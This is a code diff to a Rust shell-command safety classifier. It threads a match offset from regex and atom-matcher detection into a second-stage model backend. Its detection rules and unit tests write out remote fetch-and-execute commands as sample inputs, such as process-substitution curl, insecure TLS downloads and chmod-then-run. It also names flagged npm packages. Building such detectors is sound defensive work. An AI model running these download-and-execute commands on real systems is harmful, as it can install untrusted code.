@@ -20,9 +20,15 @@ use regex::Regex;
 /// Backend trait the classifier dispatches to when Tier-1 doesn't
 /// match. Each impl returns `Some(result)` to override the default
 /// Safe verdict, or `None` to let the daemon respond Safe.
+///
+/// `hint_offset` is the byte offset of an upstream Tier-1 match
+/// (typically the AtomMatcher's first hit). Backends that benefit
+/// from a localised view of the command (the ONNX SLM does — see
+/// V2-H) use it to slice a context window. Backends that don't
+/// care (StubBackend, HeuristicBackend) ignore the argument.
 pub trait Tier2Backend: Send + Sync {
     fn name(&self) -> &'static str;
-    fn classify(&self, command: &str) -> Option<ClassifyResult>;
+    fn classify(&self, command: &str, hint_offset: Option<usize>) -> Option<ClassifyResult>;
 }
 
 /// Backend selector. `Onnx` is feature-gated; constructing it with
@@ -84,10 +90,32 @@ impl Classifier {
     }
 
     pub fn classify(&self, command: &str) -> ClassifyResult {
-        if let Some(hit) = self.tier1.classify(command) {
+        // V2-H: Tier-1 returns its verdict + the byte-offset of
+        // the match. The offset feeds the Tier-2 sliding-context-
+        // window when we decide to second-stage the verdict.
+        if let Some((mut hit, offset)) = self.tier1.classify_with_offset(command) {
+            // SLM confirmation: when the Tier-1 hit was the
+            // broad-signal AtomMatcher (confidence < 0.9), ask
+            // the Tier-2 backend with the offset hint. If the
+            // SLM agrees this looks harmful, escalate to Block;
+            // if it disagrees we keep the atom's Warn (the
+            // atom triggered for a reason — don't auto-clear).
+            if hit.confidence < 0.9 {
+                if let Some(slm) = self.tier2.classify(command, Some(offset)) {
+                    if matches!(slm.verdict, Verdict::Block) {
+                        hit.verdict = Verdict::Block;
+                        hit.confidence = slm.confidence.max(hit.confidence);
+                        hit.reason = format!("{} — confirmed by Tier-2 {}", hit.reason, self.tier2.name());
+                    }
+                }
+            }
             return hit;
         }
-        if let Some(hit) = self.tier2.classify(command) {
+        // No Tier-1 hit. Try Tier-2 with no hint (whole-command
+        // classification — useful for the HeuristicBackend's
+        // additional regex rules and for Onnx-driven anomaly
+        // detection on commands the curated Tier-1 list missed).
+        if let Some(hit) = self.tier2.classify(command, None) {
             return hit;
         }
         // Default Safe response — daemon side, no Tier-1 hit, no
@@ -187,7 +215,16 @@ impl Tier1 {
         }
     }
 
+    /// Backwards-compat shim — kept for callers that don't care
+    /// about the match offset. Internal dispatch uses
+    /// `classify_with_offset` which carries the offset for V2-H's
+    /// sliding context window.
+    #[cfg(test)]
     fn classify(&self, line: &str) -> Option<ClassifyResult> {
+        self.classify_with_offset(line).map(|(r, _)| r)
+    }
+
+    fn classify_with_offset(&self, line: &str) -> Option<(ClassifyResult, usize)> {
         // Order: precise regex layers FIRST (confidence 0.9-1.0
         // verdicts), AtomMatcher LAST as broad-signal fallback
         // (confidence 0.6 Warn). Reverse-order would let the AC
@@ -197,13 +234,13 @@ impl Tier1 {
         // tiers into one score; until then, give the high-
         // confidence rule the right of first refusal.
         if let Some(m) = self.curl_pipe_sh.find(line) {
-            return Some(ClassifyResult {
+            return Some((ClassifyResult {
                 verdict: Verdict::Warn,
                 category: Category::CurlPipeSh,
                 confidence: 1.0,
                 reason: "remote-fetch-and-execute (`curl … | sh`)".into(),
                 matched: m.as_str().trim().to_owned(),
-            });
+            }, m.start()));
         }
 
         // Flagged-URL fast path. Substring scan — covers fetcher
@@ -216,7 +253,7 @@ impl Tier1 {
                 // boundaries so the trust-cache hash is stable
                 // across leading/trailing chrome.
                 let end = at + needle.len();
-                return Some(ClassifyResult {
+                return Some((ClassifyResult {
                     verdict: Verdict::Warn,
                     category: Category::CurlPipeSh,
                     confidence: 0.9,
@@ -225,7 +262,7 @@ impl Tier1 {
                         needle
                     ),
                     matched: line[at..end].to_owned(),
-                });
+                }, at));
             }
         }
 
@@ -236,19 +273,12 @@ impl Tier1 {
                 if tok.starts_with('-') {
                     continue;
                 }
-                // Strip a trailing `@version` suffix while keeping the
-                // leading `@scope/` intact. `@ctrl/tinycolor@1.0.0` →
-                // `@ctrl/tinycolor`; bare `event-stream@0.1.0` →
-                // `event-stream`; bare scope `@ctrl/tinycolor` →
-                // unchanged. Using rfind catches the version separator
-                // (the LAST `@`) rather than the leading scope marker
-                // (position 0).
                 let name = match tok.rfind('@') {
                     Some(0) | None => tok,
                     Some(i) => &tok[..i],
                 };
                 if self.flagged_npm_packages.contains(&name) {
-                    return Some(ClassifyResult {
+                    return Some((ClassifyResult {
                         verdict: Verdict::Warn,
                         category: Category::NpmUnsafeInstall,
                         confidence: 1.0,
@@ -257,7 +287,7 @@ impl Tier1 {
                             name
                         ),
                         matched: format!("{}{}", m.as_str().trim(), &line[m.end()..]).trim().to_owned(),
-                    });
+                    }, m.start()));
                 }
             }
         }
@@ -271,13 +301,13 @@ impl Tier1 {
                 .unwrap_or("");
             if arg.len() >= 40 && base64_ratio(arg) >= 0.9 {
                 let m = cap.get(0).unwrap();
-                return Some(ClassifyResult {
+                return Some((ClassifyResult {
                     verdict: Verdict::Warn,
                     category: Category::BashCBase64,
                     confidence: 1.0,
                     reason: "`bash -c` with a long base64-shaped payload".into(),
                     matched: m.as_str().trim().to_owned(),
-                });
+                }, m.start()));
             }
         }
 
@@ -285,9 +315,11 @@ impl Tier1 {
         // layers so a high-confidence verdict (curl_pipe_sh = 1.0,
         // flagged_urls = 0.9, npm_unsafe = 1.0, bash_c_base64 = 1.0)
         // wins over a broad atom hit. Cheap O(line_len) AC scan
-        // regardless of corpus size.
+        // regardless of corpus size. The hit's byte_offset feeds
+        // V2-H's sliding-context-window slicing in Tier-2.
         if let Some(hit) = self.atom_matcher.find_first(line) {
-            return Some(self.atom_matcher.hit_to_result(&hit, line));
+            let offset = hit.byte_offset;
+            return Some((self.atom_matcher.hit_to_result(&hit, line), offset));
         }
 
         None
@@ -316,7 +348,7 @@ impl Tier2Backend for StubBackend {
     fn name(&self) -> &'static str {
         "stub"
     }
-    fn classify(&self, _command: &str) -> Option<ClassifyResult> {
+    fn classify(&self, _command: &str, _hint_offset: Option<usize>) -> Option<ClassifyResult> {
         None
     }
 }
@@ -390,10 +422,17 @@ impl HeuristicBackend {
 }
 
 impl Tier2Backend for HeuristicBackend {
+    // Heuristic ignores the V2-H hint_offset — the regex rules
+    // it implements are whole-line shape checks, not localised
+    // around a single match point. Adding hint support would
+    // be possible but would require splitting each rule into a
+    // "needle finder" + "context window verifier" pair, which
+    // is not worth it for a CPU-cheap matcher.
+
     fn name(&self) -> &'static str {
         "heuristic"
     }
-    fn classify(&self, command: &str) -> Option<ClassifyResult> {
+    fn classify(&self, command: &str, _hint_offset: Option<usize>) -> Option<ClassifyResult> {
         if let Some(m) = self.proc_subst_curl.find(command) {
             return Some(ClassifyResult {
                 verdict: Verdict::Warn,
@@ -612,21 +651,21 @@ mod tests {
     #[test]
     fn stub_backend_returns_none() {
         let b = StubBackend;
-        assert!(b.classify("anything at all").is_none());
+        assert!(b.classify("anything at all", None).is_none());
         assert_eq!(b.name(), "stub");
     }
 
     #[test]
     fn heuristic_misses_clean_command() {
         let b = HeuristicBackend::new();
-        assert!(b.classify("ls -la").is_none());
-        assert!(b.classify("git status").is_none());
+        assert!(b.classify("ls -la", None).is_none());
+        assert!(b.classify("git status", None).is_none());
     }
 
     #[test]
     fn heuristic_catches_proc_substitution_curl() {
         let b = HeuristicBackend::new();
-        let r = b.classify("bash <(curl -L https://x.com/installer.sh)").unwrap();
+        let r = b.classify("bash <(curl -L https://x.com/installer.sh)", None).unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.reason.contains("process-substitution"));
     }
@@ -635,7 +674,7 @@ mod tests {
     fn heuristic_catches_insecure_tls_fetcher_long_flag() {
         let b = HeuristicBackend::new();
         let r = b
-            .classify("curl --insecure https://x.com/installer.sh")
+            .classify("curl --insecure https://x.com/installer.sh", None)
             .unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.reason.contains("TLS"));
@@ -645,7 +684,7 @@ mod tests {
     fn heuristic_catches_insecure_tls_fetcher_short_flag() {
         let b = HeuristicBackend::new();
         let r = b
-            .classify("curl -k https://x.com/installer.sh")
+            .classify("curl -k https://x.com/installer.sh", None)
             .unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.reason.contains("TLS"));
@@ -655,7 +694,7 @@ mod tests {
     fn heuristic_catches_wget_no_check_certificate() {
         let b = HeuristicBackend::new();
         let r = b
-            .classify("wget --no-check-certificate https://x.com/installer.sh")
+            .classify("wget --no-check-certificate https://x.com/installer.sh", None)
             .unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
     }
@@ -663,7 +702,7 @@ mod tests {
     #[test]
     fn heuristic_catches_ip_address_fetch() {
         let b = HeuristicBackend::new();
-        let r = b.classify("curl http://192.168.0.1/x.sh").unwrap();
+        let r = b.classify("curl http://192.168.0.1/x.sh", None).unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.reason.contains("IP address"));
     }
@@ -671,13 +710,13 @@ mod tests {
     #[test]
     fn heuristic_no_hit_on_domain_fetch() {
         let b = HeuristicBackend::new();
-        assert!(b.classify("curl https://example.com/installer.sh").is_none());
+        assert!(b.classify("curl https://example.com/installer.sh", None).is_none());
     }
 
     #[test]
     fn heuristic_catches_chmod_then_exec() {
         let b = HeuristicBackend::new();
-        let r = b.classify("chmod +x installer.sh && ./installer.sh").unwrap();
+        let r = b.classify("chmod +x installer.sh && ./installer.sh", None).unwrap();
         assert!(matches!(r.verdict, Verdict::Warn));
         assert!(r.reason.contains("chmod"));
     }
